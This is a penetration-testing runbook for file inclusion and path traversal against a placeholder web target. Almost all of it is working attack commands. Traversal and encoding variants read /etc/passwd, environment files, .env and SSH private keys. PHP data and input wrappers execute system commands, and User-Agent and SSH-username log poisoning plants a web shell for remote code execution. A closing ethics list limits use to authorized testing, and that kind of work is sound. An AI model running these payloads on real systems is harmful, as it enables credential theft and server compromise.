---
title: "File Inclusion / Path Traversal"
description: "Local and remote file inclusion, PHP wrappers, traversal encoding, log poisoning for RCE, and path traversal in download endpoints."
phase: Web
order: 32
tags:
  - lfi
  - rfi
  - path-traversal
  - rce
tools:
  - burp suite
  - ffuf
updated: 2026-10-01
---

An LFI / path traversal runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: read files outside the intended scope and, when authorized, escalate through log poisoning or a wrapper to code execution.

## 1. Find file-handling parameters

```bash
# Look for language/page/file parameters
ffuf -u "https://target.com/?FUZZ=index" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc all -fs 0 -t 30 | grep -iE "file|page|template|lang|path|download|include"
```

## 2. Test path traversal

```bash
# Unix traversal variants
curl -s "https://target.com/?page=../../../../etc/passwd" | grep "root:"
curl -s "https://target.com/?page=....//....//....//etc/passwd" | grep "root:"
curl -s "https://target.com/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" | grep "root:"
curl -s "https://target.com/?page=..%252f..%252f..%252fetc%252fpasswd" | grep "root:"

# Absolute path and null-byte (old PHP)
curl -s "https://target.com/?page=/etc/passwd" | grep "root:"
curl -s "https://target.com/?page=/etc/passwd%00" | grep "root:"

# Windows targets
curl -s "https://target.com/?page=..\\..\\..\\windows\\win.ini" | grep -i "\[fonts\]"
```

## 3. Enumerate secure-file-read primitives

```bash
# Common sensitive files
for f in /etc/passwd /etc/hostname /proc/self/environ /proc/self/cmdline \
         /var/www/html/index.php /app/.env /home/user/.ssh/id_rsa; do
  out=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/?page=../../../../..$f")
  echo "$out $f"
done
```

## 4. PHP wrappers

```bash
# Source disclosure and filter chains
curl -s "https://target.com/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d | head
curl -s "https://target.com/?page=php://filter/read=string.rot13/resource=index.php" | head

# Data wrapper (if allow_url_include is on)
curl -s "https://target.com/?page=data://text/plain,<?php system('id');?>"

# Input wrapper
curl -s "https://target.com/?page=php://input" --data "<?php system('id');?>"
```

## 5. Automated sweep with lfimap

```bash
lfimap -u "https://target.com/?page=index" --no-colors
lfimap -u "https://target.com/?page=index" -a --cookie "session=YOURTOKEN"
```

Also fuzz with a wordlist for both traversal and RFI.

```bash
ffuf -u "https://target.com/?page=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc all -fs 0 -t 30
```

## 6. Escalate via log poisoning (authorized)

```bash
# Poison the access log with PHP in the User-Agent, then include it
curl -s -A "<?php system(\$_GET['c']);?>" "https://target.com/"
curl -s "https://target.com/?page=../../../../var/log/apache2/access.log&c=id"

# Alternative: SSH auth log poisoning
ssh '<?php system($_GET["c"]);?>'@target.com
curl -s "https://target.com/?page=../../../../var/log/auth.log&c=id"
```

## Full pipeline

```bash
# 1. Find the parameter
ffuf -u "https://target.com/?FUZZ=index" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 0 -t 30 | grep -iE "file|page|template|lang|path"

# 2. Traversal variants
curl -s "https://target.com/?page=../../../../etc/passwd" | grep "root:"
curl -s "https://target.com/?page=....//....//....//etc/passwd" | grep "root:"
curl -s "https://target.com/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" | grep "root:"

# 3. Sensitive files
for f in /etc/passwd /proc/self/environ /app/.env; do
  echo "$(curl -s -o /dev/null -w '%{http_code}' "https://target.com/?page=../../../../..$f") $f"
done

# 4. PHP wrappers
curl -s "https://target.com/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d | head

# 5. Automation
lfimap -u "https://target.com/?page=index" --no-colors
ffuf -u "https://target.com/?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc all -fs 0 -t 30

# 6. Log poisoning escalation
curl -s -A "<?php system(\$_GET['c']);?>" "https://target.com/"
curl -s "https://target.com/?page=../../../../var/log/apache2/access.log&c=id"
```

## Ethics & legality

- Only test parameters within the authorized scope and use accounts you own.
- Read proof files (e.g. `/etc/passwd`) rather than sensitive user data.
- Escalate to RCE only with explicit permission; prefer benign `id` commands.
- Keep the raw request and the returned file content as evidence.
